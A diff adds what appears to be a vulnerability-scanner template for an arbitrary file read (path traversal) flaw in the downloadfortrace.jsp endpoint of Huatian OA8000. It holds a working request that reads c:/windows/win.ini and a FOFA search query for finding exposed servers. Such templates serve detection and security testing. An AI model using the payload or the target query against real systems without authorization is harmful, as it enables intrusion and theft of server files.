@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '[fonts]'
+            - '[extensions]'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini'
+id: huatian-oa8000-downloadfortrace-lfi
+info:
+    author: onewin
+    description: |
+        华天动力OA8000系统的downloadfortrace.jsp接口存在路径遍历漏洞，可读取服务器任意文件
+        [漏洞发现时间：2025年7月]
+    metadata:
+        fofa-query: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+    name: 华天动力OA8000 downloadfortrace.jsp 任意文件读取漏洞
+    severity: high
+    tags:
+        - 华天动力OA
+        - WebObjects
+        - ewebeditor
+        - 华天动力oa
+        - eWebEditor
+        - webobjects
